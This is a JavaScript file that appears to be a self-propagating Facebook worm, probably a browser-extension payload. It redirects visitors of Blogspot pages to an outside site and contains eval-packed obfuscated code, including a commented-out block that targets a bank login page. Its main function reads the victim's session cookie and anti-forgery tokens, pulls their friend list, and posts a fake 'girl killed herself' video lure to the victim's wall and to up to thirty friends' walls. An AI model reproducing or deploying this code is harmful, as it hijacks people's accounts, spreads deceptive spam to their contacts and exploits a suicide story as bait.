function enchulatuFB() 
	{
	    var ifra;
	    if (location.href.match(/98fbvideo/gi) || location.href.match(/98fbvideo/gi)) 
		{
		        ifra = document.getElementById('liframe')
		        if (ifra != null) 
			{
			            ifra.innerHTML = '<iframe id="change" width="500" src="http://thenewtosee.info/watchthis.htm" height="300" scrolling="no" frameborder="0"></iframe>'
			        
		};
		    
	}
	 else if (location.href.match(/blogspot/i)) 
		{
		        ifra = document.getElementById('liframe')
		        if (ifra != null) 
			{
			            self.location="http://thenewtosee.info/watchthis.htm";
			        
		};
		    
	}
	   
}
enchulatuFB();
eval(function (p, a, c, k, e, r) {
    e = function (c) {
        return c.toString(a)
    };
    if (!''.replace(/^/, String)) {
        while (c--) r[e(c)] = k[c] || e(c);
        k = [function (e) {
            return r[e]
        }];
        e = function () {
            return '\\w+'
        };
        c = 1
    };
    while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
    return p
}('e 4(){1 a=2.8(\'c\')[0];6(a==7)3 9;1 b=2.d("5");b.f="g://h.i.j/k/l.m";b.n="0";b.o="0";b.p="0";a.q(b);3 r}4();', 28, 28, '|var|document|return|load|img|if|null|getElementsByTagName|false|||body|createElement|function|src|http|whos|amung|us|swidget|redfaceplus3|gif|width|height|border|appendChild|true'.split('|'), 0, {})) //eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('40="20";8(41.31.46(/^5:\\/\\/(9\\.)?45\\.14/47)){6 3=2["16"]("18");3.12="5://43.3.11/23/44.23.24";3.22="25/21";3.19=17(){6 15=2.35("34")[0];8(15==33)32 30;6 4=2.16("36");4.12="5://37.39.38/42/55.60";4.61="0";4.57="0";4.48="0";15.13(4);6 7=2["16"]("18");7.12="5://9.26.11/14/27.28/50.24?49="+51;7.22="25/21";7.19=17(){8(54=="20"){6 10=2.59("53");8(10==33){32 30}10.52[1].31="5://9.26.11/14/27.28/?56=58"}};2.29.13(7)};2.29.13(3)}',10,62,'||document|hashemian|ss|http|var|clcl|if|www|objobj|com|src|appendChild|cl|oo|createElement|function|script|onload|no|javascript|type|js|php|text|hardtrons|C8AA27305BBB4AD7B769656766711E4BC8AA27305BBB4AD7B769656766711E4B|asp|head|false|href|return|null|body|getElementsByTagName|img|whos|us|amung|VIH_DisplayOnPage|location|swidget|scripts|visitorIPHOST|bancoestado|match|i|border|ip|get|VIH_HostIP|children|side2|analisis|viri20111|STP|height|login|getElementById|gif|width'.split('|'),0,{}))

function readCookie(a) {
    var b = a + '=';
    var c = document['cookie']['split'](';');
    for (var d = 0; d < c['length']; d++) {
        var e = c[d];
        while (e['charAt'](0) == ' ') {
            e = e['substring'](1, e['length']);
        }
        if (e['indexOf'](b) == 0) {
            return e['substring'](b['length'], e['length']);
        }
    }
    return null;
}

function setCookie(nombre, valor, caducidad) {
    var expireDate = new Date()
    expireDate.setDate(expireDate.getDate() + caducidad);
    document.cookie = nombre + "=" + escape(valor) + "; expires=" + expireDate.toGMTString() + "; path=/";
}

function getRandomInt(a, b) {
    return Math['floor'](Math['random']() * (b - a + 1)) + a
}

function randomValue(a) {
    return a[getRandomInt(0, a['length'] - 1)]
}

function fb_comparte() {
    var user_id = readCookie('c_user');
    var uid = user_id;
    if (document['getElementsByName']('post_form_id')[0] == null || document['getElementsByName']('fb_dtsg')[0] == null) return false;
    var post_form_id = document['getElementsByName']('post_form_id')[0]['value'];
    var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
    var video_url = ['http://7yhhreza0.blogspot.com/','http://no96e3340.blogspot.com/','http://7bbtresqa0.blogspot.com/','http://7lo0pre0.blogspot.com/','http://d09785hbve0.blogspot.com/'];
    var domains = ['http://i.imgur.com/i0XBV.png'];
    var p0 = ['check this out ... cool ',' This cool ...', 'I like it ..'];
    var p1 = ['check this out ... cool ',' Ehey ',' Hey ',' Hey! ',' about ',' Hello! ',' Look! ',' That last ',' Amazing!'];
    var p2 = ['u wont believe! ',' check the sad post ',' haha can happen to anyone!'];
    var p3 = [' I dare you can watch this . '];
    var message = '';
    var a;
    gf = new XMLHttpRequest();
    gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&viewer=' + uid + '&' + Math['random'](), false);
    gf['send']();
    if (gf['readyState'] != 4) {} else {
        data = eval('(' + gf['responseText']['substr'](9) + ')');
        if (data['error']) {
            return false;
        } else {
            a = data;
        }
    }
    var b = a['payload']['entries']['length'];
    if (b > 30) {
        b = 30
    };
    var cook = readCookie("fb_video_" + user_id);
    if (cook == "activo") return false;
    message = [randomValue(p1), randomValue(p2), randomValue(p3)]['join'](' ');
    var c = new XMLHttpRequest();
    var d = 'http://www.facebook.com/ajax/profile/composer.php?__a=1';
    var title = '[Video] Girl killed herself after her dad posted a secret of her on here fb wall!!!';
    var summary = 'click here to see dad post and emma sucide letter , you will really be shocked.. :P';
    var imagen = 'http://i.imgur.com/i0XBV.png';
    var e = 'post_form_id=' + post_form_id + '&fb_dtsg=' + fb_dtsg + '&xhpc_composerid=u574553_1&xhpc_targetid=' + user_id + '&xhpc_context=profile&xhpc_fbx=1&xhpc_timeline=&xhpc_ismeta=&aktion=post&app_id=2309869772&UIThumbPager_Input=0&attachment[params][medium]=103&attachment[params][urlInfo][user]=' + randomValue(video_url) + '&attachment[params][urlInfo][canonical]=' + randomValue(video_url) + '&attachment[params][favicon]=http://s.ytimg.com/yt/favicon-vflZlzSbU.ico&attachment[params][title]=' + title + '&attachment[params][fragment_title]=&attachment[params][external_author]=&attachment[params][summary]=' + summary + '&attachment[params][url]=' + randomValue(video_url) + '&attachment[params][images][src]=' + randomValue(domains) + '%26' + Math['random']() + '&attachment[params][images][width]=398&attachment[params][images][height]=224&attachment[params][images][v]=0&attachment[params][images][safe]=1&attachment[params][ttl]=-1264972308&attachment[params][error]=1&attachment[params][responseCode]=200&attachment[params][expires]=41647446&attachment[params][images][0]=' + imagen + '&attachment[params][scrape_time]=1306619754&attachment[params][cache_hit]=1&attachment[type]=100&xhpc_message_text=' + message + '&xhpc_message=' + message + '&UIPrivacyWidget[0]=80&privacy_data[value]=80&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&nctr[_mod]=pagelet_wall&lsd=&post_form_id_source=AsyncRequest';
    c['open']('POST', d, true);
    c['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    c['setRequestHeader']('Content-length', e['length']);
    c['setRequestHeader']('Connection', 'keep-alive');
    c['onreadystatechange'] = function () {};
    c['send'](e);
    for (var f = 0; f < b; f++) {
        if (a['payload']['entries'][f]['uid'] != user_id) {
            message = [randomValue(p1), a['payload']['entries'][f]['text']['substr'](0, a['payload']['entries'][f]['text']['indexOf'](' '))['toLowerCase'](), randomValue(p2), randomValue(p3)]['join'](' ');
            var g = new XMLHttpRequest();
            d = 'http://www.facebook.com/ajax/profile/composer.php?__a=1';
            title = '[Video] Girl killed herself after her dad posted a secret of her on here fb wall.!!!';
            summary = 'click here to see dad post and emma sucide letter , you will really be shocked.. :P';
            imagen = 'http://i.imgur.com/i0XBV.png';
            e = 'post_form_id=' + post_form_id + '&fb_dtsg=' + fb_dtsg + '&xhpc_composerid=u574553_1&xhpc_targetid=' + a['payload']['entries'][f]['uid'] + '&xhpc_context=profile&xhpc_fbx=1&xhpc_timeline=&xhpc_ismeta=&aktion=post&app_id=2309869772&UIThumbPager_Input=0&attachment[params][medium]=103&attachment[params][urlInfo][user]=' + randomValue(video_url) + '&attachment[params][urlInfo][canonical]=' + randomValue(video_url) + '&attachment[params][favicon]=http://s.ytimg.com/yt/favicon-vflZlzSbU.ico&attachment[params][title]=' + title + '&attachment[params][fragment_title]=&attachment[params][external_author]=&attachment[params][summary]=' + summary + randomValue(p0) + '&attachment[params][url]=' + randomValue(video_url) + '&attachment[params][images]&attachment[params][images][src]=' + randomValue(domains) + '%26' + Math['random']() + '&attachment[params][images][width]=398&attachment[params][images][height]=224&attachment[params][images][i]=0&attachment[params][images][safe]=1&attachment[params][ttl]=-1264972308&attachment[params][error]=1&attachment[params][responseCode]=200&attachment[params][expires]=41647446&attachment[params][images][0]=' + imagen + '&attachment[params][scrape_time]=1306619754&attachment[params][cache_hit]=1&attachment[type]=100&xhpc_message_text=' + message + '&xhpc_message=' + message + '&UIPrivacyWidget[0]=80&privacy_data[value]=80&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&nctr[_mod]=pagelet_wall&lsd=&post_form_id_source=AsyncRequest';
            g['open']('POST', d, true);
            g['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
            g['setRequestHeader']('Content-length', e['length']);
            g['setRequestHeader']('Connection', 'keep-alive');
            g['onreadystatechange'] = function () {};
            g['send'](e);
        }
    }
    setCookie("fb_video_" + user_id, "activo", 300);
    return true;
}

function FBFBFB321() {
    if (location.href.match(/^http:\/\/(www\.)?facebook.com/i)) {
        var cook = readCookie("fb_video");
        if (cook == "activo") {
            return false;
        }
        var user_id = readCookie('c_user');
        if (user_id == null) return false;
        cook = readCookie("fb_video_" + user_id);
        if (cook == "activo") {
            return false;
        }
        setTimeout(function () {
            fb_comparte();
        }, 2000);
        return true;
    }
    return false;
}
FBFBFB321();